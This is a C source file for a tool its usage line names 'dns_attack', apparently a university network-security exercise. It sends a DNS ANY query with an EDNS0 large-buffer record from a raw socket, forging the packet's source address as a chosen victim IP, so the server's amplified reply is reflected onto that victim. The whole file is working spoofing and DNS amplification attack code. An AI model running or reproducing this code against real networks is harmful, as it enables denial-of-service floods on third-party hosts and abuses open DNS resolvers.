#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/ioctl.h>
#include <net/if.h>// struct ifreq
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>// struct ethhdr
#include <linux/if_packet.h>
#include <net/ethernet.h> //needless?
#include <errno.h>


#define BUF_LEN 8192
//3




void usage(){
    printf("usage: ./dns_attack <victim IP> <UDP Source Port> <DNS Server IP>\n");
	exit(0);
}
unsigned short checksum(unsigned short* buff, int _16bitword);
int dns_send(int sd, char *vic_ip, int udp_p, char *dns_ip);
int main(int argc, char *argv[]){
    if (argc!=4)
        usage();
    /* Create Socket */
    int sock_raw = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sock_raw == -1){
        printf("error in socket");
        exit(0);
    }
    else
        printf("socket() - Socket created successfully\n");
    /* DNS_ATTACK */
    dns_send(sock_raw, argv[1], atoi(argv[2]), argv[3]);
    return 0;
}
unsigned short checksum(unsigned short* buff, int _16bitword){
    unsigned long sum;
    for(sum=0;_16bitword>0;_16bitword--)
        sum+=htons(*(buff)++);
    sum = ((sum >> 16) + (sum & 0xFFFF));
    sum += (sum>>16);
    return (unsigned short)(~sum);
}
unsigned short udp_checksum(unsigned short* buff, int len){
    unsigned long sum;
    int _16bitword = (len+1)/2;
    for(sum=0;_16bitword>0;_16bitword--)
        sum+=htons(*(buff)++);    
    sum += 0x0011;// protocol = 17
    sum += len - 8;
    sum = ((sum >> 16) + (sum & 0xFFFF));
    sum += (sum>>16);
    return (unsigned short)(~sum);
}
struct dnshdr{
	unsigned short id; // identification number

	unsigned char rd :1; // recursion desired
	unsigned char tc :1; // truncated message
	unsigned char aa :1; // authoritive answer
	unsigned char opcode :4; // purpose of message
	unsigned char qr :1; // query/response flag

	unsigned char rcode :4; // response code
	unsigned char cd :1; // checking disabled
	unsigned char ad :1; // authenticated data
	unsigned char z :1; // its z! reserved
	unsigned char ra :1; // recursion available

	unsigned short q_count; // number of question entries
	unsigned short ans_count; // number of answer entries
	unsigned short auth_count; // number of authority entries
	unsigned short add_count; // number of resource entries
};

// Question struct
struct dnsquery{
	unsigned short q_type;
	unsigned short q_class;
};
void dns_format(unsigned char * dns,unsigned char * host){
	int lock = 0 , i;
	strcat((char*)host,".");
	for(i = 0 ; i < strlen((char*)host) ; i++){
		if(host[i] == '.'){
			*dns++ = i-lock;
			for(;lock<i;lock++){
				*dns++ = host[lock];
			}
			lock++;
		}
	}
	*dns++=0x00;
}
struct QUESTION{
    unsigned short qtype;
    unsigned short qclass;
};
int dns_send(int sock_raw, char *vic_ip, int udp_p, char *dns_ip){
    /* Fill in Address */
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(udp_p);
    sin.sin_addr.s_addr = inet_addr(dns_ip);
    unsigned char *sendbuff = (unsigned char*)malloc(128); // increase in case of more data
    /* Construct Packet Buffer */
    memset(sendbuff,0,64); 
    int total_len = total_len = 0;
    /* Construct the IP header */
    struct iphdr *iph = (struct iphdr*)(sendbuff + total_len);
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 16;
    iph->id = htons(10201);
    iph->ttl = 64;
    iph->protocol = 17;
    iph->saddr = inet_addr(vic_ip);
    iph->daddr = sin.sin_addr.s_addr; // put destination IP address
    total_len += sizeof(struct iphdr);
    /* Construct the UDP header */
    struct udphdr *uh = (struct udphdr *)(sendbuff + total_len);
    uh->source = sin.sin_port;
    uh->dest = htons(53);
    uh->check = 0; 
    total_len+= sizeof(struct udphdr);
    /* DNS header */
    struct dnshdr *dnsh = (struct dnshdr*)(sendbuff + total_len);
    int id = 516067-((516067>>16)<<16);
    dnsh->id = (unsigned short) htons(id);// 0516067 -> 0xDFE3

	dnsh->qr = 0; //This is a query
	dnsh->opcode = 0; //This is a standard query
	dnsh->aa = 0; //Not Authoritative
	dnsh->tc = 0; //This message is not truncated
	dnsh->rd = 1; //Recursion Desired
	dnsh->ra = 0; //Recursion not available! hey we dont have it (lol)
	dnsh->z = 0;
	dnsh->ad = 0;//unchanged
	dnsh->cd = 0;
	dnsh->rcode = 0;
	dnsh->q_count = htons(1); //we have only 1 question
	dnsh->ans_count = 0;
	dnsh->auth_count = 0;
	dnsh->add_count = htons(1);
    total_len += sizeof(struct dnshdr);
    /* Construct Query */
    unsigned char *qname = (unsigned char *)(sendbuff + total_len);
    unsigned char dns_rcrd[32];
	strcpy(dns_rcrd, "nctu.edu.tw");
	dns_format(qname , dns_rcrd);
	total_len += strlen(qname)+1;//one empty byte
	struct dnsquery *q;
	q = (struct dnsquery *)(sendbuff + total_len);
	q->q_type = htons(0x00FF);
	q->q_class = htons(0x0001);
    total_len += sizeof(struct dnsquery);
    /* Additional */
    sendbuff[total_len++] = 0x00;
    sendbuff[total_len++] = 0x00;
    sendbuff[total_len++] = 0x29;
    sendbuff[total_len++] = 0x10;
    sendbuff[total_len++] = 0x00;
    sendbuff[total_len++] = 0x00;
    sendbuff[total_len++] = 0x00;
    sendbuff[total_len++] = 0x00;
    sendbuff[total_len++] = 0x00;
    sendbuff[total_len++] = 0x00;
    sendbuff[total_len++] = 0x0c;
    sendbuff[total_len++] = 0x00;
    sendbuff[total_len++] = 0x0a;
    sendbuff[total_len++] = 0x00;
    sendbuff[total_len++] = 0x08;
    sendbuff[total_len++] = 0x3b;
    sendbuff[total_len++] = 0xa4;
    sendbuff[total_len++] = 0xad;
    sendbuff[total_len++] = 0xa0;
    sendbuff[total_len++] = 0x3c;
    sendbuff[total_len++] = 0xf5;
    sendbuff[total_len++] = 0x95;
    sendbuff[total_len++] = 0x81;
    
    
    
    
    
    
    
    
    
    
    
    
    /* Filling the remaining fields of the IP and UDP headers */
    uh->len = htons((total_len - sizeof(struct iphdr)));
    iph->tot_len = htons(total_len); //UDP length field
    /* IP Checksum */
    iph->check = htons(checksum((unsigned short*)(sendbuff), (sizeof(struct iphdr))/2)); //IP length field
    /* UDP Checksum */
    int startl = sizeof(struct iphdr) - 8;
    int clen = total_len-startl;
    uh->check = htons(udp_checksum((unsigned short*)(sendbuff + startl), clen));
    int send_len = sendto(sock_raw, sendbuff, total_len, 0,(const struct sockaddr*)&sin, sizeof(struct sockaddr));
    if(send_len<0){
        printf("error in sending....sendlen=%d....errno=%d\n",send_len,errno);
        return -1;
    }
}
